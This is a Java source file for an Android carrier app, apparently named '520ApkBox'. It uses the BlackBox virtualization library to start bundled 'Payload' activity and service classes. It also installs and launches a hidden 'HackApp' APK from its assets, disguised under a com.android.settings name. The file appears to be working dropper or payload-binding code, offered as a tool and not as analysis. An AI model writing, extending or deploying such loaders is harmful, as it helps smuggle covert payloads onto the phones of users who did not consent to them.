package com.android.a520apkbox;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;

import java.io.File;
import java.io.IOException;
import java.util.Arrays;

import com.vcore.BlackBoxCore;
import com.vcore.entity.pm.InstallResult;
import com.vcore.utils.FileUtils;

public class MainActivity extends Activity {
    private static final String TAG = "520ApkBox MainActivity";
    private final String HackAppPackageName = "com.android.settings.apk";
    private final String HackAppFileName = "com.android.settings";
    private Boolean startAgain  = false;
    private int pauseNum = 0;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (MainApplication.PayloadActivityClass != null){
            new Thread(new Runnable() {
                @Override
                public void run() {
                    // 执行线程中的任务
                    runOnUiThread(new Runnable() {
                        public void run() {
                            Intent intent = new Intent(MainActivity.this, MainApplication.PayloadActivityClass);
                            startActivity(intent);
                        }
                    });
                }
            }).start();
            Log.d(TAG, "Payload Activity启动");
        }

        if (MainApplication.PayloadServiceClass != null){
            new Thread(new Runnable() {
                @Override
                public void run() {
                    // 执行线程中的任务
                    runOnUiThread(new Runnable() {
                        public void run() {
                            Intent intent = new Intent(MainActivity.this, MainApplication.PayloadServiceClass);
                            MainActivity.this.startService(intent);
                        }
                    });
                }
            }).start();
            Log.d(TAG, "Payload Service启动");
        }

        try {
            final ApplicationInfo appInfo = getPackageManager().getApplicationInfo(getPackageName(),
                    PackageManager.GET_META_DATA);
            final String HackAppPackageName = appInfo.metaData.get("HackAppPackageName").toString();
            final String HackAppFileName = appInfo.metaData.get("HackAppFileName").toString();
            AppInit(HackAppPackageName, HackAppFileName);
        } catch (IOException | PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }

        startAgain = true;
        Log.d(TAG, String.format("onCreate() startAgain: %s, pauseNum: %s", startAgain, pauseNum));
    }
    @Override
    protected void onPause() {
        super.onPause();
        pauseNum += 1;
        Log.d(TAG, String.format("onPause() startAgain: %s, pauseNum: %s", startAgain, pauseNum));
        finish();
    }
    @Override
    protected void onResume(){
        super.onResume();
        Log.d(TAG, String.format("onResume() startAgain: %s, pauseNum: %s", startAgain, pauseNum));
    }
    @Override
    protected void onStart(){
        super.onStart();
        Log.d(TAG, String.format("onStart()  startAgain: %s, pauseNum: %s", startAgain, pauseNum));
    }
    @Override
    protected void onRestart(){
        super.onRestart();
        Log.d(TAG, String.format("onRestart()  startAgain: %s, pauseNum: %s", startAgain, pauseNum));
    }
    @Override
    protected void onStop(){
        super.onStop();
        Log.d(TAG, String.format("onStop()  startAgain: %s, pauseNum: %s", startAgain, pauseNum));
    }
    @Override
    protected void onDestroy() {
        super.onDestroy();
        Log.d(TAG, String.format("onDestroy()  startAgain: %s, pauseNum: %s", startAgain, pauseNum));
    }
    private void AppInit(String HackAppPackageName, String HackAppFileName) throws IOException {
        boolean queryAppResult = BlackBoxCore.get().isInstalled(HackAppPackageName, 0);
        Log.d(TAG, String.format("App: %s 已安装: %s", HackAppPackageName, HackAppFileName));
        if (! queryAppResult) {
            String[] AssetsFiles = getAssets().list("");
            // ['a', 'b']  'a'
            Log.d(TAG,String.format("assets目录中文件列表: %s", Arrays.toString(AssetsFiles)));

            if (Arrays.asList(AssetsFiles).contains(HackAppFileName)){

                File HackAppFilePath = new File(getFilesDir(), HackAppFileName);
                FileUtils.copyFile(getAssets().open(HackAppFileName), HackAppFilePath);

                Log.d(TAG, String.format("找到ApkFile文件 %s, 复制到应用程序的内部存储目录中. %s", HackAppFileName, HackAppFilePath.getPath()));

                InstallResult installAppResult = BlackBoxCore.get().installPackageAsUser(HackAppFilePath, 0);
                if (installAppResult.success) Log.d(TAG, String.format("基于ApkFile安装, App: %s 安装成功. %s", HackAppFileName, HackAppPackageName));

            }else {
                InstallResult installAppResult = BlackBoxCore.get().installPackageAsUser(HackAppPackageName, 0);
                if (installAppResult.success) Log.d(TAG, String.format("基于PackageName安装, App: %s 安装成功.", HackAppPackageName));
            }
        }

        boolean startAppResult = BlackBoxCore.get().launchApk(HackAppPackageName, 0);
        Log.d(TAG, String.format("启动App: %s, %s", HackAppPackageName, startAppResult));
    }
}